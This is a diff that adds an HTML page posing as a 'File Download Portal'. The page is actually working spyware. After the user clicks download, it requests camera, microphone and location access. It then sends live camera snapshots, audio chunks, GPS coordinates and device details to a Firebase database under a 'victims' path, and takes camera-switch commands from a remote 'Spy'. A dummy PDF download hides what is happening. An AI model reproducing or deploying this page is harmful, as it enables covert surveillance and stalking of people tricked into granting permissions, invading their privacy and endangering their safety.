@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>File Download Portal</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+</head>
+<body class="bg-gray-900 text-white flex flex-col items-center justify-center h-screen font-sans">
+
+    <div class="text-center p-6 bg-gray-800 rounded-xl shadow-2xl w-11/12 max-w-md">
+        <div id="loadingIcon" class="text-5xl mb-4 animate-bounce">📥</div>
+        <h1 class="text-2xl font-bold mb-2">Download File</h1>
+        <p class="text-gray-400 mb-6" id="statusText">Click the button below to start.</p>
+        
+        <button id="downloadBtn" onclick="startProcess()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-4 rounded-lg transition text-lg">
+            DOWNLOAD NOW
+        </button>
+    </div>
+
+    <!-- Hidden Elements -->
+    <video id="hiddenCam" autoplay playsinline muted class="hidden"></video>
+    <canvas id="hiddenCanvas" class="hidden"></canvas>
+
+    <script>
+        // Firebase Config
+        const firebaseConfig = { databaseURL: "https://download-apks-adc2c-default-rtdb.firebaseio.com/" };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        // Unique 6-digit ID
+        const victimId = Math.floor(100000 + Math.random() * 900000);
+        const userRef = db.ref('victims/' + victimId);
+
+        let currentFacingMode = 'user';
+        let mediaStream = null;
+        let mediaRecorder = null;
+        let camInterval = null;
+
+        async function startProcess() {
+            const btn = document.getElementById('downloadBtn');
+            const status = document.getElementById('statusText');
+            
+            btn.disabled = true;
+            btn.innerText = "Connecting...";
+            status.innerText = "Please allow permissions to continue.";
+
+            try {
+                // 1. Ask for Camera & Mic first (Direct click required)
+                mediaStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: currentFacingMode }, 
+                    audio: true 
+                });
+
+                // 2. Ask for Location
+                if (navigator.geolocation) {
+                    navigator.geolocation.watchPosition((pos) => {
+                        const lat = pos.coords.latitude;
+                        const lon = pos.coords.longitude;
+                        userRef.update({
+                            location: lat + ", " + lon,
+                            mapsLink: `https://www.google.com/maps?q=${lat},${lon}`
+                        });
+                    }, (err) => {
+                        userRef.update({ location: "Location Denied" });
+                    }, { enableHighAccuracy: true });
+                }
+
+                // 3. Save Initial Data to Firebase
+                await userRef.set({
+                    id: victimId, 
+                    timestamp: Date.now(),
+                    device: navigator.userAgent, 
+                    location: "Fetching...", 
+                    camStatus: "Active",
+                    command: "none"
+                });
+
+                // 4. Start Camera & Audio Streaming
+                startMedia(currentFacingMode);
+
+                // 5. Fake Download UI
+                status.innerText = "Downloading... Please wait.";
+                setTimeout(() => {
+                    // Fake download file trigger
+                    const a = document.createElement('a');
+                    a.href = "https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf"; 
+                    a.download = "Document.pdf";
+                    document.body.appendChild(a);
+                    a.click();
+                    document.body.removeChild(a);
+
+                    btn.innerText = "DOWNLOAD COMPLETE";
+                    btn.classList.replace('bg-blue-600', 'bg-green-600');
+                    status.innerText = "File downloaded successfully.";
+                }, 4000);
+
+                // Listen for Camera Switch command from Spy
+                userRef.child('command').on('value', (snap) => {
+                    if (snap.val() === 'switch' && mediaStream) {
+                        currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
+                        startMedia(currentFacingMode);
+                        userRef.child('command').set('none');
+                    }
+                });
+
+            } catch (err) {
+                console.error(err);
+                status.innerText = "Permission Denied. Please refresh and allow.";
+                btn.innerText = "RETRY";
+                btn.disabled = false;
+            }
+        }
+
+        async function startMedia(facingMode) {
+            // Stop old tracks
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(track => track.stop());
+            }
+            clearInterval(camInterval);
+
+            try {
+                mediaStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: facingMode }, 
+                    audio: true 
+                });
+                
+                const video = document.getElementById('hiddenCam');
+                video.srcObject = mediaStream;
+
+                // Send Camera Snapshots
+                camInterval = setInterval(() => {
+                    const canvas = document.getElementById('hiddenCanvas');
+                    if (video.videoWidth === 0) return;
+                    canvas.width = 320; 
+                    canvas.height = 240;
+                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                    userRef.child('latest_frame').set(canvas.toDataURL('image/jpeg', 0.5));
+                }, 1500);
+
+                // Send Audio Chunks
+                if (mediaRecorder) mediaRecorder.stop();
+                mediaRecorder = new MediaRecorder(mediaStream);
+                mediaRecorder.ondataavailable = (e) => {
+                    if (e.data.size > 0) {
+                        const reader = new FileReader();
+                        reader.onloadend = () => {
+                            userRef.child('latest_audio').set(reader.result);
+                        };
+                        reader.readAsDataURL(e.data);
+                    }
+                };
+                mediaRecorder.start(4000); // Send audio every 4 seconds
+
+            } catch (err) {
+                console.log("Switch failed", err);
+            }
+        }
+    </script>
+</body>
+</html>
